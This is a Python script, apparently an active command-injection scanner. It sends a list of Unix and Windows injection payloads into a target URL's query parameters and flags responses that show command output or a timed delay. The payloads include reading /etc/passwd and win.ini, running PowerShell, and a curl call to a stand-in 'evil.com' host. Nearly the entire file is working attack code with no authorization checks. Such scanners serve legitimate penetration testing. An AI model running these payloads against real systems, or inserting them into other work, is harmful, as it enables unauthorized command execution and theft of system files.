import requests
import time
from urllib.parse import urlparse, parse_qs, urljoin
import logging

# Advanced Command Injection Payloads (Unix and Windows)
ADVANCED_CMD_PAYLOADS = [
    # Unix-based
    "; id",                   # Get user ID
    "| whoami",               # Get username
    "&& ls -la",              # List directory (Unix)
    "; cat /etc/passwd",      # Read sensitive file
    "| uname -a",             # System info
    "; ping -c 5 127.0.0.1",  # Delay-inducing command
    "|| echo VULN",           # Echo if successful
    "; curl http://evil.com", # External request
    # Windows-based
    "& whoami",               # Windows username
    "| dir",                  # List directory (Windows)
    "&& type c:\\windows\\win.ini",  # Read Windows config
    "; powershell -c 'Get-Process'",  # PowerShell execution
    "| ping 127.0.0.1 -n 5",  # Delay-inducing command (Windows)
    "& echo %USERNAME%",      # Echo Windows username
]

# Time-based payload for blind detection
TIME_BASED_CMD_PAYLOAD = "; sleep 5"  # Unix (or "| ping 127.0.0.1 -n 5" for Windows)

# Signatures indicating command execution
CMD_SIGNATURES = [
    "uid=", "gid=",          # Unix 'id' output
    "root", "admin",         # Common usernames
    "dir", "volume",         # Windows 'dir' output
    "VULN",                  # Custom echo
    "powershell", "cmd.exe", # Command interpreters
    "passwd", "win.ini",     # File contents
]

def check_command_injection(url, extra_params=None, max_tests=10):
    """
    Advanced command injection scanner with OS-agnostic payloads and time-based checks.
    
    Args:
        url (str): Target URL (e.g., 'http://example.com/cmd.php?input=test').
        extra_params (dict): Additional query params to test (e.g., {'cmd': 'test'}).
        max_tests (int): Limit payload tests per parameter.
    
    Returns:
        dict: Scan results with vulnerable params and time-based test.
    """
    results = {
        "action": "check_cmd_injection",
        "url": url,
        "vulnerable_params": [],
        "time_based_test": None
    }

    # Parse URL and parameters
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    original_params = parse_qs(parsed.query)
    if extra_params:
        original_params.update(extra_params)
    if not original_params:
        original_params = {"input": ["test"]}  # Default param if none provided

    # Test each parameter with payloads
    for param, values in original_params.items():
        original_value = values[0]
        tested_count = 0

        for payload in ADVANCED_CMD_PAYLOADS:
            if tested_count >= max_tests:
                break
            test_params = original_params.copy()
            test_params[param] = [payload]

            try:
                r = requests.get(base_url, params=test_params, timeout=5)
                combined_text = r.text.lower()
                if any(sig in combined_text for sig in CMD_SIGNATURES):
                    results["vulnerable_params"].append({
                        "param": param,
                        "payload": payload,
                        "vulnerable": True,
                        "evidence": "Command output detected in response"
                    })
                else:
                    results["vulnerable_params"].append({
                        "param": param,
                        "payload": payload,
                        "vulnerable": False
                    })
            except requests.RequestException as e:
                logging.error(f"Request failed for {payload}: {e}")
            tested_count += 1

    # Time-based command injection check (blind detection)
    first_param = next(iter(original_params))
    test_params = original_params.copy()
    test_params[first_param] = [TIME_BASED_CMD_PAYLOAD]

    try:
        start_time = time.time()
        requests.get(base_url, params=test_params, timeout=10)
        end_time = time.time()
        if end_time - start_time > 4:  # 4s threshold for 5s delay
            results["time_based_test"] = {
                "payload": TIME_BASED_CMD_PAYLOAD,
                "vulnerable": True,
                "evidence": "Significant delay (possible blind command injection)"
            }
        else:
            results["time_based_test"] = {
                "payload": TIME_BASED_CMD_PAYLOAD,
                "vulnerable": False
            }
    except requests.RequestException:
        results["time_based_test"] = {
            "payload": TIME_BASED_CMD_PAYLOAD,
            "vulnerable": False,
            "note": "Request failed during time-based test"
        }

    return results